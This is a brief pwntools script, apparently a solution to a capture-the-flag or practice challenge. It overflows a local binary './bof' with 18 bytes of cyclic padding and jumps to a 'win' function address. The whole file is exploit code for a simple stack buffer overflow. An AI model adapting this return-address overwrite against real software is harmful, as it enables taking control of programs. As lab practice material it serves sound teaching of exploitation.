from pwn import *

p = process("./bof")

offset = 18
win_addr = p64(0x0401166)

payload = ""
payload += cyclic(offset)
payload += win_addr

p.sendline(payload)
print p.recvline()

p.close()